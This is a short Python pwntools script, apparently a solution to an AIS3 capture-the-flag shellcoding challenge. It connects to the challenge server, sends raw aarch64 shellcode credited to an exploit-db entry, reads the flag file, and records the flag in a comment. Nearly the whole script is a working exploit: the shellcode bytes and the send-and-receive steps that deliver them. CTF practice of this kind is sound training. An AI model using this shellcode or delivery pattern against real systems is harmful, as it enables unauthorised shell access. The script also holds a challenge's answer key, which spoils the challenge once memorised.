from pwn import *

p = remote('127.0.0.1', 15566)
p = remote('chals1.ais3.org', 15566)

# ref: https://www.exploit-db.com/exploits/47048
shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

p.recv()
p.send(b'AAAA')
p.recv()
p.send(shellcode)
print(p.recv())
p.sendline(b'cat home/give_me_sc/flag')
print(p.recv().decode())
print(p.recv().decode())
# p.interactive()

# Flag: AIS3{Y0uR_f1rst_Aarch64_Shellcoding}
